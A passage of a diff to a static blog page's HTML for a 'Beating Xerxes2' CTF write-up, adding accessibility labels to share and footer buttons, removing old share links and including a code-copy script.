     </a>
   </li>
   <li>
-    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f08%2f09%2fbeating-xerxes2%2f&is_video=false&description=Beating%20Xerxes2">
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f08%2f09%2fbeating-xerxes2%2f&is_video=false&description=Beating%20Xerxes2" aria-label="Pinterest">
       <i class="fab fa-pinterest fa-lg" aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="mailto:?subject=Beating%20Xerxes2&body=Check out this article: https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f08%2f09%2fbeating-xerxes2%2f">
+    <a class="icon" href="mailto:?subject=Beating%20Xerxes2&body=Check out this article: https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f08%2f09%2fbeating-xerxes2%2f" aria-label="Email">
       <i class="fas fa-envelope fa-lg" aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f08%2f09%2fbeating-xerxes2%2f&title=Beating%20Xerxes2">
+    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f08%2f09%2fbeating-xerxes2%2f&title=Beating%20Xerxes2" aria-label="Pocket">
       <i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f08%2f09%2fbeating-xerxes2%2f&title=Beating%20Xerxes2">
+    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f08%2f09%2fbeating-xerxes2%2f&title=Beating%20Xerxes2" aria-label="reddit">
       <i class="fab fa-reddit fa-lg" aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="http://www.stumbleupon.com/submit?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f08%2f09%2fbeating-xerxes2%2f&title=Beating%20Xerxes2">
-      <i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="http://digg.com/submit?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f08%2f09%2fbeating-xerxes2%2f&title=Beating%20Xerxes2">
-      <i class="fab fa-digg fa-lg" aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f08%2f09%2fbeating-xerxes2%2f&name=Beating%20Xerxes2&description=%3ch2%20id%3d%22foreword%22%3eforeword%3c%2fh2%3e%0a%3cp%3eXerxes2%20is%20a%20successor%20in%20a%20boot2root%20series%20by%20%3ca%20href%3d%22https%3a%2f%2ftwitter.com%2fbarrebas%22%3e%40barrebas%3c%2fa%3e%20hosted%20by%20%3ca%20href%3d%22https%3a%2f%2ftwitter.com%2fvulnhub%22%3e%40VulnHub%3c%2fa%3e.%20If%20you%20haven%26rsquo%3bt%20done%20it%20yet%2c%20close%20this%20article%20%3cem%3enow%3c%2fem%3e%20and%20go%20learn%20by%20doing%20it%21%3c%2fp%3e%0a%3cp%3eXerxes2%2c%20like%20most%20other%20boot2root%20type%20CTF%26rsquo%3bs%2c%20has%20once%20again%20forced%20me%20to%20learn%20a%20whole%20lot%20more%20than%20I%20thought%20possible.%20In%20total%20it%20took%20me%20about%203%20or%204%20days%20on%20and%20off%20to%20complete.%20The%20goal%20was%20as%20usual%2c%20read%20%3ccode%3e%2froot%2fflag.txt%3c%2fcode%3e.%20This%20is%20the%20path%20I%20took%20to%20read%20the%20flag%20and%20gain%20root%20command%20execution.%20Enjoy%21%3c%2fp%3e">
+    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f08%2f09%2fbeating-xerxes2%2f&name=Beating%20Xerxes2&description=%3ch2%20id%3d%22foreword%22%3eforeword%3c%2fh2%3e%0a%3cp%3eXerxes2%20is%20a%20successor%20in%20a%20boot2root%20series%20by%20%3ca%20href%3d%22https%3a%2f%2ftwitter.com%2fbarrebas%22%3e%40barrebas%3c%2fa%3e%20hosted%20by%20%3ca%20href%3d%22https%3a%2f%2ftwitter.com%2fvulnhub%22%3e%40VulnHub%3c%2fa%3e.%20If%20you%20haven%26rsquo%3bt%20done%20it%20yet%2c%20close%20this%20article%20%3cem%3enow%3c%2fem%3e%20and%20go%20learn%20by%20doing%20it%21%3c%2fp%3e%0a%3cp%3eXerxes2%2c%20like%20most%20other%20boot2root%20type%20CTF%26rsquo%3bs%2c%20has%20once%20again%20forced%20me%20to%20learn%20a%20whole%20lot%20more%20than%20I%20thought%20possible.%20In%20total%20it%20took%20me%20about%203%20or%204%20days%20on%20and%20off%20to%20complete.%20The%20goal%20was%20as%20usual%2c%20read%20%3ccode%3e%2froot%2fflag.txt%3c%2fcode%3e.%20This%20is%20the%20path%20I%20took%20to%20read%20the%20flag%20and%20gain%20root%20command%20execution.%20Enjoy%21%3c%2fp%3e" aria-label="Tumblr">
       <i class="fab fa-tumblr fa-lg" aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f08%2f09%2fbeating-xerxes2%2f&t=Beating%20Xerxes2">
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f08%2f09%2fbeating-xerxes2%2f&t=Beating%20Xerxes2" aria-label="Hacker News">
       <i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i>
     </a>
   </li>
@@ -1017,13 +999,13 @@ root@xerxes2:~#
 
     <div id="actions-footer">
       
-        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;">
+        <a id="menu-toggle" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;" aria-label="Menu">
           <i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
-        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;">
+        <a id="toc-toggle" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;" aria-label="TOC">
           <i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
-        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;">
+        <a id="share-toggle" class="icon" href="#" onclick="$('#share-footer').toggle();return false;" aria-label="Share">
           <i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> share</a>
-        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');">
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
           <i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
     </div>
 
@@ -1059,6 +1041,7 @@ root@xerxes2:~#
 <link rel="stylesheet" href=https://leonjza.github.io/lib/font-awesome/css/all.min.css>
 <script src=https://leonjza.github.io/lib/jquery/jquery.min.js></script>
 <script src=https://leonjza.github.io/js/main.js></script>
+<script src=https://leonjza.github.io/js/code-copy.js></script>
 
 
 
